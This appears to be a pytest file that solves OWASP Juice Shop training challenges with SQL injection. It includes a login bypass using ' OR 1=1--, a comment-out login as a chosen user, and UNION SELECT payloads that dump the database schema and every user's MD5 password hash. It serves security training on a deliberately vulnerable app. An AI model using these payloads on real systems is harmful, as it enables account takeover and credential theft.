"""A03:2021 Injection: SQL injection in login and product search."""
import re

from conftest import jwt_claims


def test_login_as_admin_without_a_password(shop, solves):
    # The login query is built from strings, so ' OR 1=1-- makes the WHERE
    # clause always true and returns the first user: the admin.
    with solves("Login Admin"):
        response = shop.login("' OR 1=1--", "anything")
    assert response.status_code == 200
    assert jwt_claims(response.json()["authentication"]["token"])["data"]["email"] == "admin@juice-sh.op"


def test_login_as_a_chosen_user(shop, solves):
    # A quote closes the email string and -- comments out the password check.
    with solves("Login Jim"):
        response = shop.login("jim@juice-sh.op'--", "anything")
    assert jwt_claims(response.json()["authentication"]["token"])["data"]["email"] == "jim@juice-sh.op"


def test_dump_the_database_schema(shop, solves):
    # The search query is also built from strings. UNION adds rows from
    # sqlite_master (the schema) to the product results; 9 columns to match.
    payload = "qwert')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--"
    with solves("Database Schema"):
        response = shop.get("/rest/products/search", params={"q": payload})
    assert any("CREATE TABLE" in str(row.get("id")) for row in response.json()["data"])


def test_dump_every_users_credentials(shop, solves):
    payload = "qwert')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--"
    with solves("User Credentials"):
        response = shop.get("/rest/products/search", params={"q": payload})
    rows = response.json()["data"]
    admin = next(r for r in rows if r["name"] == "admin@juice-sh.op")
    # Unsalted MD5: a second vulnerability on top of the injection.
    assert re.fullmatch(r"[0-9a-f]{32}", admin["description"])
